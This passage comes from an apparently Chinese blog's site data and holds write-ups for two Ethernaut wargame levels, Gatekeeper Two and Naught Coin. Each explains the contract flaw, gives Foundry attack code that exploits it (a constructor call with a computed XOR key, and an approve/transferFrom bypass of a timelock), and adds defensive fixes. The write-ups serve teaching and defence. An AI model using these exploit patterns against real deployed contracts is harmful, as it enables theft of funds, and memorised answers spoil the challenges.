^ C = B</span><br><span class=\"line\">        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));</span><br><span class=\"line\">        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF</span><br><span class=\"line\">        bytes8 gateKey = bytes8(keyPart ^ max_uint);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 在构造函数中调用 enter 函数</span><br><span class=\"line\">        instance.enter(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>创建攻击合约</strong>: 攻击逻辑完全包含在 <code>constructor</code> 中。</li>\n<li><strong>在 <code>constructor</code> 中调用</strong>: 这是关键。在 <code>constructor</code> 中调用 <code>enter</code> 函数，此时 <code>extcodesize(address(this))</code> 为0，绕过了 <code>gateTwo</code>。</li>\n<li><strong>计算 <code>_gateKey</code></strong>: 在 <code>constructor</code> 中，使用 <code>address(this)</code> 作为 <code>msg.sender</code> 来计算 <code>keccak256</code> 哈希，并通过XOR运算得到正确的 <code>_gateKey</code>，从而绕过 <code>gateThree</code>。</li>\n<li><strong>部署即攻击</strong>: 部署攻击合约的交易一旦成功，攻击就完成了，<code>entrant</code> 将被设置为我们的EOA地址。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>避免使用 <code>extcodesize</code> 进行合约检查</strong>: 正如本例所示，<code>extcodesize</code> 可以被 <code>constructor</code> 调用绕过。一个更可靠的检查方法是判断 <code>address.balance &gt; 0</code> 或者 <code>address.code.length &gt; 0</code>（在Solidity 0.8.10及更高版本中）。</li>\n<li><strong>对 <code>caller</code> 的额外检查</strong>: 如果确实需要阻止合约调用，可以结合 <code>tx.origin == msg.sender</code> 的检查，但这会限制合约的可组合性。</li>\n<li><strong>简化密钥验证</strong>: 复杂的密钥派生逻辑（如本例中的XOR）可能看起来安全，但如果所有输入都来自链上，攻击者通常可以逆向工程出正确的密钥。应使用链下签名等更安全的机制。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong><code>constructor</code></strong>: 合约的构造函数，仅在合约部署时执行一次。理解其在生命周期中的特殊性（如 <code>extcodesize</code> 为0）是解决此类挑战的关键。</li>\n<li><strong><code>extcodesize</code></strong>: 一个EVM操作码，用于获取地址的代码大小。是区分EOA和合约的常用方法，但有其局限性。</li>\n<li><strong>异或运算 (<code>^</code>)</strong>: 一种位运算符，在密码学和哈希操作中很常见。理解其 <code>A ^ B = C</code> &lt;&#x3D;&gt; <code>A ^ C = B</code> 的性质对于解决 <code>gateThree</code> 至关重要。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>合约在 <code>constructor</code> 执行期间的代码大小（<code>extcodesize</code>）为0。</li>\n<li><code>caller()</code> 和 <code>address(this)</code> 在特定上下文中的区别和联系。</li>\n<li>异或（XOR）运算的可逆性是解决密码学相关谜题的常用工具。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>利用 <code>constructor</code> 的特性绕过 <code>extcodesize</code> 检查。</li>\n<li>在 <code>constructor</code> 中完成所有攻击步骤，实现“部署即攻击”。</li>\n<li>逆向工程XOR逻辑以计算出所需的密钥。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>不要依赖 <code>extcodesize</code> 来判断一个地址是否为合约。</li>\n<li>设计更简单、更直接的验证机制，避免模糊的链上密钥派生。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction\">Solidity Docs: <code>extcodesize</code> Caveats</a></li>\n<li><a href=\"https://www.evm.codes/\">Understanding the EVM: Opcodes</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-14-Gatekeeper-Two-合约创建时的-extcodesize\"><a href=\"#🎯-Ethernaut-Level-14-Gatekeeper-Two-合约创建时的-extcodesize\" class=\"headerlink\" title=\"🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize\"></a>🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/14\">Ethernaut Level 14 - Gatekeeper Two</a><br><strong>攻击类型</strong>: <code>extcodesize</code> &#x2F; <code>constructor</code> 交互<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>与上一关类似，我们需要再次通过三个 <code>modifier</code> 的检查，成为 <code>entrant</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg\" alt=\"Gatekeeper Two Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>要通过此关卡，我们需要调用 <code>enter(bytes8 _gateKey)</code> 函数，并绕过它的三个 <code>modifier</code>。</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>与第13关完全相同。我们需要通过一个中间合约来调用 <code>enter</code> 函数，以确保 <code>msg.sender</code> 是合约地址，而 <code>tx.origin</code> 是我们的EOA地址。</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  uint x;</span><br><span class=\"line\">  assembly &#123;</span><br><span class=\"line\">    x := extcodesize(caller())</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  require(x == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 使用内联汇编检查 <code>caller()</code> 的 <code>extcodesize</code> 是否为0。<code>caller()</code> 返回的是直接调用者的地址（在我们的场景中，就是攻击合约的地址），而 <code>extcodesize</code> 返回该地址关联的代码大小。</p>\n<ul>\n<li>如果调用者是一个已经部署的合约，<code>extcodesize</code> 会返回一个大于0的值。</li>\n<li>如果调用者是一个外部账户（EOA），<code>extcodesize</code> 返回0。</li>\n</ul>\n<p>这与 <code>gateOne</code> 的要求（<code>msg.sender</code> 必须是合约）产生了矛盾。我们如何才能让一个合约地址的 <code>extcodesize</code> 为0呢？</p>\n<p>答案在于合约的创建过程：<strong>当一个合约的 <code>constructor</code> 正在执行时，该合约的代码尚未完全部署到链上，因此此时对该合约地址调用 <code>extcodesize</code> 会返回0。</strong></p>\n<p>因此，我们必须在攻击合约的 <code>constructor</code> 内部调用目标合约的 <code>enter</code> 函数。</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 包含一个有趣的异或（XOR）逻辑。让我们简化一下：</p>\n<p><code>A ^ B = C</code></p>\n<p>其中：</p>\n<ul>\n<li><code>A</code> 是 <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code></li>\n<li><code>B</code> 是 <code>uint64(_gateKey)</code></li>\n<li><code>C</code> 是 <code>type(uint64).max</code> (即 <code>0xFFFFFFFFFFFFFFFF</code>)</li>\n</ul>\n<p>根据异或运算的性质，如果 <code>A ^ B = C</code>，那么 <code>A ^ C = B</code>。</p>\n<p>因此，我们可以通过计算 <code>A ^ C</code> 来得到我们需要的 <code>_gateKey</code>。</p>\n<p><code>_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p>\n<p>由于 <code>msg.sender</code> 是我们的攻击合约地址，我们可以在攻击合约的 <code>constructor</code> 中计算出这个值。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>我们的攻击合约非常简洁。它在 <code>constructor</code> 中完成所有的工作：计算 <code>gateKey</code> 并立即调用目标实例的 <code>enter</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/14_GatekeeperTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Foundry 测试合约</span><br><span class=\"line\">contract GatekeeperTwoTest is Test &#123;</span><br><span class=\"line\">    GatekeeperTwo instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperTwo();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // 部署攻击合约时，其构造函数会自动执行攻击</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">        // 验证攻击是否成功</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 计算 gateKey</span><br><span class=\"line\">        // A ^ C = B</span><br><span class=\"line\">        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));</span><br><span class=\"line\">        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF</span><br><span class=\"line\">        bytes8 gateKey = bytes8(keyPart ^ max_uint);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 在构造函数中调用 enter 函数</span><br><span class=\"line\">        instance.enter(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>创建攻击合约</strong>: 攻击逻辑完全包含在 <code>constructor</code> 中。</li>\n<li><strong>在 <code>constructor</code> 中调用</strong>: 这是关键。在 <code>constructor</code> 中调用 <code>enter</code> 函数，此时 <code>extcodesize(address(this))</code> 为0，绕过了 <code>gateTwo</code>。</li>\n<li><strong>计算 <code>_gateKey</code></strong>: 在 <code>constructor</code> 中，使用 <code>address(this)</code> 作为 <code>msg.sender</code> 来计算 <code>keccak256</code> 哈希，并通过XOR运算得到正确的 <code>_gateKey</code>，从而绕过 <code>gateThree</code>。</li>\n<li><strong>部署即攻击</strong>: 部署攻击合约的交易一旦成功，攻击就完成了，<code>entrant</code> 将被设置为我们的EOA地址。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>避免使用 <code>extcodesize</code> 进行合约检查</strong>: 正如本例所示，<code>extcodesize</code> 可以被 <code>constructor</code> 调用绕过。一个更可靠的检查方法是判断 <code>address.balance &gt; 0</code> 或者 <code>address.code.length &gt; 0</code>（在Solidity 0.8.10及更高版本中）。</li>\n<li><strong>对 <code>caller</code> 的额外检查</strong>: 如果确实需要阻止合约调用，可以结合 <code>tx.origin == msg.sender</code> 的检查，但这会限制合约的可组合性。</li>\n<li><strong>简化密钥验证</strong>: 复杂的密钥派生逻辑（如本例中的XOR）可能看起来安全，但如果所有输入都来自链上，攻击者通常可以逆向工程出正确的密钥。应使用链下签名等更安全的机制。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong><code>constructor</code></strong>: 合约的构造函数，仅在合约部署时执行一次。理解其在生命周期中的特殊性（如 <code>extcodesize</code> 为0）是解决此类挑战的关键。</li>\n<li><strong><code>extcodesize</code></strong>: 一个EVM操作码，用于获取地址的代码大小。是区分EOA和合约的常用方法，但有其局限性。</li>\n<li><strong>异或运算 (<code>^</code>)</strong>: 一种位运算符，在密码学和哈希操作中很常见。理解其 <code>A ^ B = C</code> &lt;&#x3D;&gt; <code>A ^ C = B</code> 的性质对于解决 <code>gateThree</code> 至关重要。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>合约在 <code>constructor</code> 执行期间的代码大小（<code>extcodesize</code>）为0。</li>\n<li><code>caller()</code> 和 <code>address(this)</code> 在特定上下文中的区别和联系。</li>\n<li>异或（XOR）运算的可逆性是解决密码学相关谜题的常用工具。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>利用 <code>constructor</code> 的特性绕过 <code>extcodesize</code> 检查。</li>\n<li>在 <code>constructor</code> 中完成所有攻击步骤，实现“部署即攻击”。</li>\n<li>逆向工程XOR逻辑以计算出所需的密钥。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>不要依赖 <code>extcodesize</code> 来判断一个地址是否为合约。</li>\n<li>设计更简单、更直接的验证机制，避免模糊的链上密钥派生。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction\">Solidity Docs: <code>extcodesize</code> Caveats</a></li>\n<li><a href=\"https://www.evm.codes/\">Understanding the EVM: Opcodes</a></li>\n</ul>\n"},{"title":"Ethernaut Level 15: Naught Coin - ERC20 approve/transferFrom漏洞","date":"2025-01-25T08:20:00.000Z","updated":"2025-01-25T08:20:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"利用ERC20标准中的 `approve` 和 `transferFrom` 组合，绕过不完整的 `transfer` 函数限制。深入理解ERC20代币标准和继承覆盖的安全性影响，掌握 Naught Coin 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 15: Naught Coin - ERC20 approve/transferFrom漏洞\n\n> **关卡链接**: [Ethernaut Level 15 - Naught Coin](https://ethernaut.openzeppelin.com/level/15)  \n> **攻击类型**: ERC20 `approve`/`transferFrom` 漏洞  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n作为 `player`，你初始拥有全部的 `NaughtCoin` 代币。然而，合约中的 `transfer` 函数被锁定，十年内无法转移代币。你的目标是在锁定期结束前，将你的全部代币从你的地址中转移出去。\n\n![Naught Coin Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg)\n\n## 🔍 漏洞分析\n\n让我们看一下 `NaughtCoin` 合约。它继承自 OpenZeppelin 的 `ERC20` 标准合约。\n\n```solidity\ncontract NaughtCoin is ERC20 {\n    uint public timeLock;\n    address public player;\n\n    constructor(address _player) ERC20(\"NaughtCoin\", \"0x0\") {\n        player = _player;\n        timeLock = block.timestamp + 10 * 365 days;\n        _mint(player, 1000000 * (10**18));\n    }\n\n    modifier lockTokens() {\n        if (msg.sender == player) {\n            require(block.timestamp > timeLock, \"NaughtCoin: time lock is active\");\n            _;\n        } else {\n            _;\n        }\n    }\n\n    // Override transfer to lock tokens for the player\n    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {\n        return super.transfer(_to, _value);\n    }\n    \n    // Other functions are inherited from ERC20\n}\n```\n\n合约通过 `override` 重写了 `transfer` 函数，并为其增加了一个 `lockTokens` 修饰符。这个修饰符会检查 `msg.sender` 是否为 `player`，如果是，则要求 `block.timestamp` 大于 `timeLock`（十年之后）。这意味着我们作为 `player`，无法直接调用 `transfer` 函数来转移代-笔。\n\n然而，开发者只重写了 `transfer` 函数，却忽略了 `ERC20` 标准中的另一个重要的代币转移函数：`transferFrom(address from, address to, uint256 amount)`。\n\n`transferFrom` 函数允许一个地址（`spender`）在得到 `owner` 授权（`approve`）后，从 `owner` 的账户中转移代币到任何地址。\n\n由于 `NaughtCoin` 合约没有重写 `transferFrom`，它将直接使用 OpenZeppelin `ERC20` 合约中的原始实现，而这个原始实现是没有 `lockTokens` 修饰符的！\n\n因此，攻击路径变得清晰：\n1.  我们（`player`）调用 `approve` 函数，授权给另一个地址（可以是自己，也可以是任何其他地址）转移我们的全部代币。\n2.  我们（或被授权的地址）调用 `transferFrom` 函数，将代币从我们的账户中转移出去。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n在 Foundry 测试中，我们可以直接模拟这个过程。我们甚至不需要一个单独的攻击合约，因为 `player` 可以授权给自己来执行 `transferFrom`。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/15_NaughtCoin.sol\";\n\ncontract NaughtCoinTest is Test {\n    NaughtCoin instance;\n    address player1;\n    address player2;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        player2 = vm.addr(2); // 一个用于接收代币的地址\n        instance = new NaughtCoin(player1);\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n\n        // 获取 player1 的全部余额\n        uint256 playerBalance = instance.balanceOf(player1);\n\n        // 步骤 1: player1 授权给 player1 (自己) 转移全部余额\n        instance.approve(player1, playerBalance);\n\n        // 步骤 2: player1 调用 transferFrom 将自己的代币转移到 player2\n        instance.transferFrom(player1, player2, playerBalance);\n\n        // 验证结果\n        assertEq(instance.balanceOf(player1), 0);\n        assertEq(instance.balanceOf(player2), playerBalance);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **获取余额**: 首先，确定 `player` 地址拥有的代币总量。\n2.  **授权 (`approve`)**: `player` 调用 `instance.approve(spender, amount)`，其中 `spender` 是被授权的地址，`amount` 是授权额度。在这里，我们让 `player` 授权给自己全部余额。\n3.  **转移 (`transferFrom`)**: `player` 调用 `instance.transferFrom(from, to, amount)`，其中 `from` 是 `player` 地址，`to` 是接收地址，`amount` 是要转移的数量。\n\n这个过程成功地绕过了 `transfer` 函数的 `timeLock` 限制。\n\n## 🛡️ 防御措施\n\n1.  **完整地覆盖函数**: 当继承一个标准（如ERC20）并打算修改其核心功能时，必须确保所有相关的函数都被一致地修改。在这个案例中，如果 `transfer` 被锁定，那么 `transferFrom` 也应该被同样的方式锁定。\n\n    ```solidity\n    // 正确的修复方式\n    function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) {\n        return super.transferFrom(from, to, value);\n    }\n    ```\n\n2.  **使用成熟的代币锁定合约**: 与其自己实现时间锁，不如使用经过审计和广泛使用的解决方案，例如 OpenZeppelin 的 `TokenTimelock` 合约。这些合约已经考虑了各种边缘情况。\n\n## 🔧 相关工具和技术\n\n-   **ERC20 标准**: 深入理解ERC20代币标准的全部接口是至关重要的，包括 `transfer`, `approve`, `transferFrom`, `balanceOf`, `allowance` 等。\n-   **函数覆盖 (`override`)**: 在Solidity中，当子合约需要修改父合约的行为时，使用 `override` 关键字。但必须小心，确保所有相关的行为都被覆盖，以避免产生漏洞。\n-   **Foundry `prank`**: `vm.startPrank` 是模拟特定地址（如 `player`）执行操作的强大工具，使得在测试中模拟多步攻击流程变得简单。\n\n## 🎯 总结\n\n**核心概念**:\n-   ERC20标准定义了一套代币交互的接口，仅仅限制其中一个（`transfer`）是不够的。\n-   `approve` 和 `transferFrom` 的组合是ERC20的一个核心功能，允许第三方代为转移代币。\n-   在进行合约继承和函数覆盖时，必须保持逻辑的一致性，否则很容易引入漏洞。\n\n**攻击向量**:\n-   识别出合约只限制了 `transfer` 函数，而没有限制 `transferFrom` 函数。\n-   利用 `approve` 和 `transferFrom` 的标准功能来绕过不完整的安全限制。\n\n**防御策略**:\n-   在修改继承合约的功能时，进行全面的影响分析，确保所有相关的函数都得到一致的处理。\n-   优先使用经过社区审计和验证的标准实现，而不是自己重新发明轮子。\n\n## 📚 参考资料\n\n-   [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)\n-   [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)\n-   [Solidity Docs: Overriding](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding)","source":"_posts/ethernaut-level-15-naught-coin.md","raw":"---\ntitle: 'Ethernaut Level 15: Naught Coin - ERC20 approve/transferFrom漏洞'\ndate: 2025-01-25 16:20:00\nupdated: 2025-01-25 16:20:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - ERC20\n  - approve\n  - transferFrom\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"利用ERC20标准中的 `approve` 和 `transferFrom` 组合，绕过不完整的 `transfer` 函数限制。深入理解ERC20代币标准和继承覆盖的安全性影响，掌握 Naught Coin 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 15: Naught Coin - ERC20 approve/transferFrom漏洞\n\n> **关卡链接**: [Ethernaut Level 15 - Naught Coin](https://ethernaut.openzeppelin.com/level/15)  \n> **攻击类型**: ERC20 `approve`/`transferFrom` 漏洞  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n作为 `player`，你初始拥有全部的 `NaughtCoin` 代币。然而，合约中的 `transfer` 函数被锁定，十年内无法转移代币。你的目标是在锁定期结束前，将你的全部代币从你的地址中转移出去。\n\n![Naught Coin Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg)\n\n## 🔍 漏洞分析\n\n让我们看一下 `NaughtCoin` 合约。它继承自 OpenZeppelin 的 `ERC20` 标准合约。\n\n```solidity\ncontract NaughtCoin is ERC20 {\n    uint public timeLock;\n    address public player;\n\n    constructor(address _player) ERC20(\"NaughtCoin\", \"0x0\") {\n        player = _player;\n        timeLock = block.timestamp + 10 * 365 days;\n        _mint(player, 1000000 * (10**18));\n    }\n\n    modifier lockTokens() {\n        if (msg.sender == player) {\n            require(block.timestamp > timeLock, \"NaughtCoin: time lock is active\");\n            _;\n        } else {\n            _;\n        }\n    }\n\n    // Override transfer to lock tokens for the player\n    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {\n        return super.transfer(_to, _value);\n    }\n    \n    // Other functions are inherited from ERC20\n}\n```\n\n合约通过 `override` 重写了 `transfer` 函数，并为其增加了一个 `lockTokens` 修饰符。这个修饰符会检查 `msg.sender` 是否为 `player`，如果是，则要求 `block.timestamp` 大于 `timeLock`（十年之后）。这意味着我们作为 `player`，无法直接调用 `transfer` 函数来转移代-笔。\n\n然而，开发者只重写了 `transfer` 函数，却忽略了 `ERC20` 标准中的另一个重要的代币转移函数：`transferFrom(address from, address to, uint256 amount)`。\n\n`transferFrom` 函数允许一个地址（`spender`）在得到 `owner` 授权（`approve`）后，从 `owner` 的账户中转移代币到任何地址。\n\n由于 `NaughtCoin` 合约没有重写 `transferFrom`，它将直接使用 OpenZeppelin `ERC20` 合约中的原始实现，而这个原始实现是没有 `lockTokens` 修饰符的！\n\n因此，攻击路径变得清晰：\n1.  我们（`player`）调用 `approve` 函数，授权给另一个地址（可以是自己，也可以是任何其他地址）转移我们的全部代币。\n2.  我们（或被授权的地址）调用 `transferFrom` 函数，将代币从我们的账户中转移出去。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n在 Foundry 测试中，我们可以直接模拟这个过程。我们甚至不需要一个单独的攻击合约，因为 `player` 可以授权给自己来执行 `transferFrom`。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/15_NaughtCoin.sol\";\n\ncontract NaughtCoinTest is Test {\n    NaughtCoin instance;\n    address player1;\n    address player2;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        player2 = vm.addr(2); // 一个用于接收代币的地址\n        instance = new NaughtCoin(player1);\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n\n        // 获取 player1 的全部余额\n        uint256 playerBalance = instance.balanceOf(player1);\n\n        // 步骤 1: player1 授权给 player1 (自己) 转移全部余额\n        instance.approve(player1, playerBalance);\n\n        // 步骤 2: player1 调用 transferFrom 将自己的代币转移到 player2\n        instance.transferFrom(player1, player2, playerBalance);\n\n        // 验证结果\n        assertEq(instance.balanceOf(player1), 0);\n        assertEq(instance.balanceOf(player2), playerBalance);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **获取余额**: 首先，确定 `player` 地址拥有的代币总量。\n2.  **授权 (`approve`)**: `player` 调用 `instance.approve(spender, amount)`，其中 `spender` 是被授权的地址，`amount` 是授权额度。在这里，我们让 `player` 授权给自己全部余额。\n3.  **转移 (`transferFrom`)**: `player` 调用 `instance.transferFrom(from, to, amount)`，其中 `from` 是 `player` 地址，`to` 是接收地址，`amount` 是要转移的数量。\n\n这个过程成功地绕过了 `transfer` 函数的 `timeLock` 限制。\n\n## 🛡️ 防御措施\n\n1.  **完整地覆盖函数**: 当继承一个标准（如ERC20）并打算修改其核心功能时，必须确保所有相关的函数都被一致地修改。在这个案例中，如果 `transfer` 被锁定，那么 `transferFrom` 也应该被同样的方式锁定。\n\n    ```solidity\n    // 正确的修复方式\n    function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) {\n        return super.transferFrom(from, to, value);\n    }\n    ```\n\n2.  **使用成熟的代币锁定合约**: 与其自己实现时间锁，不如使用经过审计和广泛使用的解决方案，例如 OpenZeppelin 的 `TokenTimelock` 合约。这些合约已经考虑了各种边缘情况。\n\n## 🔧 相关工具和技术\n\n-   **ERC20 标准**: 